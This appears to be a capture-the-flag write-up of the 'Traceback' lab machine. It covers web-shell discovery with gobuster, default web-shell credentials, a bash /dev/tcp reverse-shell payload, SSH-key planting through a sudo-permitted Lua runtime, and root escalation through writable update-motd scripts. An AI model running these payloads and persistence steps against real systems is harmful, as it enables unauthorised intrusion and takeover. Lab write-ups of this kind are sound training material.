1, Recon
Port scan
	22/tcp ssh
	80/tcp http

Page check and web-content enumerate

There is something interesting from the source page 
```
<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
```
I kicked off a gobuster in the background, but it wouldn’t find anything. I googled the term “Some of the best web shells that you might need”, and the top hit was a nice match:
![](images/Pasted%20image%2020240918081921.png)

So we guess there are some web-shells created by Xh4H. So we need to find a word list of web-shell's name.
`https://github.com/TheBinitGhimire/Web-Shells.git`

Then we can make a wordlist and we can use the `gobuster` to catch the valid web-shell.
`gobuster dir -u http://10.10.10.181/ -w webshell.txt`
`/smevk.php` would be our target.
And there is a login page which is so cool.
![](images/Pasted%20image%2020240918083559.png)

By check the `smevk.php` source code, we can get the default credit
`admin:admin`
![](images/Pasted%20image%2020240918083504.png)

To be honest, this web shell is so cool and attractive, so many interesting parts and modules, but for us, we only need to handle a reverse shell.
![](images/Pasted%20image%2020240918084651.png)

payload: `/bin/bash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"` in the console module.
Then we can handle the shell, or if we want to get a stable shell, we can write into authorized_key and use ssh to login as webadmin.

There is two users in the home directory `sysadmin` and `webadmin`

And we can read the `note.txt` in the `/home/webadmin'
```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```
There is another file `owned.msg` in  `/opt`
```
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
```

When I check the `.bash_history` of `webadmin`
```
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```
Then we can also check `sudo -l`
```
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

And when we check the user id
```
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```
That means we need to switch to the sysadmin, then we can use the `/home/sysadmin/luvit`.

`Luvit is a Async I/O for Lua, similar to Node.js.`

I can’t access /home/sysadmin, but the luvit binary must be there because running it starts a repl:
```
webadmin@traceback:~$ /home/sysadmin/luvit
-bash: /home/sysadmin/luvit: Permission denied
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> 
```
Then we can make a simple Lua script that writes my SSH key into sysadmin’s authorized_keys file at /dev/shm/.wither.lua
```
authkeys = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
authkeys:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO0dl48snyfNIrhj7V9tMQpXE5B0uCuiCXQxCdZLYglN70DyHDODd5y6jdo4JhorRyBK7kEguQZErAGWtJOs9Q8Tk6VLE1PmRc+vZMFH7FhM+Bdr6kH3bjHbPvLr/rqwYKCzUB5oYZOAJP9+6azC/SiBdtne0TN7uzTLXIO9+nFvfX6ZEL+Exkc3Tux7BlmatBJAOjvSHY94NXylZzyNM8HKDLp1fR43f64oKDL5odQFumuYDS2PvRRTMcx9NJ8xc1PD2STFd9xXvcpyXnE+WJjbc0s/iq6bgw6FrN7yYEegXolRsLh9jMFQtfJnBExqK2PWMm++UH2U6W4CXdKq1Vjlj+ZbWoC8SM3lL+H2y+wB2xjugQolebG3JS1r6NLGCDygY25ySUskXPdprwPf6vFCQiSdr2EHATwJI3HQMMUyBuEuHawppop60atUcMOhXny0h7//zJ/td6fouJT14KxQ/3f3B/ifXoAmIX8Y15FBxY70qeubV1XE+TnaXaw7IdESxEn5mIl13cIleAv/UFF4fEyXutr3ceDFHE4MOsL4KzynSfNmUMKkkbf+IbVGiJTKrzjzcCPx4KBKkhybmidX3q3LOwXvtltF/7t5/bM9D8JB7rT/3VF4ECtPt9Mr2FbahMz9Uzm1yKcu0sNbx9DFKSVtn2larH+zqh7QU7iQ== test")
authkeys:close()
```

The filename is arbitrary, but it does need to end in .lua.

Running it fails on it’s own, but using sudo to run as sysadmin works without issue:
```
webadmin@traceback:~$ /home/sysadmin/luvit /dev/shm/.wither.lua 
-bash: /home/sysadmin/luvit: Permission denied

webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit /dev/shm/.wither.lua
```

By uploading the `pspy64`, I found something interesting
```
2024/09/18 06:19:56 CMD: UID=0    PID=1      | /sbin/init noprompt 
2024/09/18 06:20:01 CMD: UID=0    PID=1780   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/                                                                    
2024/09/18 06:20:01 CMD: UID=0    PID=1779   | sleep 30 
2024/09/18 06:20:01 CMD: UID=0    PID=1778   | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/                                                         
2024/09/18 06:20:01 CMD: UID=0    PID=1775   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
```
I guess `update-motd.d` would be our target.

This led me to look at these directories. I can’t write in /var/backups/.update-motd.d. But the files in /etc/update-motd.d are writable by the sysadmin group:

```
sysadmin@traceback:/etc$ ls -l update-motd.d/
total 24
-rwxrwxr-x 1 root sysadmin  981 Mar 15 09:39 00-header
-rwxrwxr-x 1 root sysadmin  982 Mar 15 09:39 10-help-text
-rwxrwxr-x 1 root sysadmin 4264 Mar 15 09:39 50-motd-news
-rwxrwxr-x 1 root sysadmin  604 Mar 15 09:39 80-esm
-rwxrwxr-x 1 root sysadmin  299 Mar 15 09:39 91-release-upgrade
```

These are the scripts that root runs each time a user logs into the box. Looking at one of these, I can see they are each shell scripts:
```
sysadmin@traceback:/etc/update-motd.d$ cat 91-release-upgrade 
#!/bin/sh

# if the current release is under development there won't be a new one
if [ "$(lsb_release -sd | cut -d' ' -f4)" = "(development" ]; then
    exit 0
fi
if [ -x /usr/lib/ubuntu-release-upgrader/release-upgrade-motd ]; then
    exec /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
fi
```

I could add a reverse shell into one of these, but instead I’ll add code to get my public key into /root/.ssh/authorized_keys:
```
sysadmin@traceback:/etc/update-motd.d$ echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/" >> 00-header 
```

These files are going to be run when I SSH into the box. So I’ll immediately SSH into the box as webadmin before the 30 second cleanup happens. When I do, the 00-header script is run, and now my public key should be in root’s authorized_keys file.
\
I’ll SSH in as root.

Beyond the root:
Just to take a quick look at the cron that’s driving the cleanup, it is actually two crons:

```
root@traceback:~# crontab -l
...[snip]...
# m h  dom mon dow   command
* * * * * /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
* * * * * sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

The first just runs, and the second does a sleep for 30 seconds, and then runs the same thing. This effectively has the cleanup run every 30 seconds.
